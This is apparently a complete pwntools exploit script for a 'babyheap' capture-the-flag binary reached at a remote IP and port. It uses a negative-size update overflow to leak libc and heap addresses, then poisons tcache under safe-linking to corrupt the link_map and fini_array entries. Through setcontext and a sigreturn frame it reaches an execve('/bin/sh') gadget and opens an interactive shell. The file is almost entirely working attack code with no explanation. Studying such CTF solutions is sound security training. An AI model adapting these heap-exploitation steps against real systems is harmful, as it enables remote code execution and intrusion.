import pwd


from pwn import *
import sys

elf = ELF("babyheap")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

#io = process(elf.path)
io = remote("47.100.33.132", 2204)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

gdb.attach(io, gdb_args = ['-ex', 'init-pwndbg'])

def command(x):
    io.sendlineafter(b"Command: ", x)

def allocate(size, ctx):
    command(b"1")
    io.sendlineafter(b"Size: ", size)
    io.sendlineafter(b"Content: ", ctx)

def update(idx, size, ctx):
    command(b"2")
    io.sendlineafter(b"Index: ", idx)
    io.sendlineafter(b"Size: ", size)
    io.sendlineafter(b"Content: ", ctx)

def delete(idx):
    command(b"3")
    io.sendlineafter(b"Index: ", idx)

def view(idx):
    command(b"4")
    io.sendlineafter(b"Index: ", idx)
    io.recvuntil(b"]: ")
    rcv = io.recvuntil(b"1.")
    return rcv[:-2]

def exit():
    command(b"5")

# libc and heap addr leak
allocate(b"8", b"AAA") # 0
allocate(b"8", b"AAA") # 1
allocate(b"1270", b"AAA") # 2

payload = b"A" * 0x18
payload += p64(0x521)
update(b"0", b"-1", payload)
delete(b"1")
allocate(b"8", b"AAA") # 1
allocate(b"1236", b"AAA") # 3
allocate(b"8", b"AAA") # 4
delete(b"3")
delete(b"4")
r = view(b"2")

libc.address = u64(r[:8]) - 0x219ce0
heap_base_addr = u64(r[1248:1256]) << 12
print("libc base addr: " + str(hex(libc.address)))
print("heap base addr: " + str(hex(heap_base_addr)))

# overwrite pointer to fini_array
delete(b"1")
l_addr_addr = libc.address + 0x2692e0
l_info_arraysz_addr = l_addr_addr + 0x120
one_gadget = libc.address + 0xebcf1 # execve("/bin/sh", r10, [rbp-0x70])
mov_rdx_r12_pop_pop_ret = libc.address + 0xa8148

payload = b"\x00" * 0x18
payload += p64(0x21)
payload += p64(l_addr_addr ^ (heap_base_addr >> 12))[:7]
update(b"0", b"-1", payload)

payload = p64(libc.sym["setcontext"] + 0x3d)
payload += p64(libc.sym["gets"])[:7]
#payload = p64(one_gadget)
#payload += p64(mov_rdx_r12_pop_pop_ret)[:7]

allocate(b"16", payload) # 1

payload = p64(heap_base_addr + 0x370 - elf.get_section_by_name(".fini_array").header.sh_addr)[:7]
allocate(b"8", payload) # 3
allocate(b"32", b"AAA") # 4
allocate(b"32", b"AAA") # 5
allocate(b"32", b"AAA") # 6
delete(b"6")
delete(b"5")

payload = b"A" * 0x28
payload += p64(0x31)
payload += p64(l_info_arraysz_addr ^ (heap_base_addr >> 12))[:7]
update(b"4", b"-1", payload)

payload = p64(0x1c) + p64(0x10) + p64(0x0)
allocate(b"32", payload) # 5

payload = p64(heap_base_addr + 0x310)[:7]
allocate(b"32", payload) # 6

payload = p64(libc.sym["setcontext"] + 0x3d)
payload += p64(libc.sym["gets"])
s = SigreturnFrame()
s.rsp = heap_base_addr + 0x300
s.rdi = next(libc.search(b"/bin/sh\x00"))
s.rsi = 0
s.rdx = 0
s.r10 = 0
s.rbp = heap_base_addr + 0x500
s.rip = one_gadget
payload += flat(s)[8:]
allocate(b"1000", payload)
#io.sendline(flat(s))

io.interactive()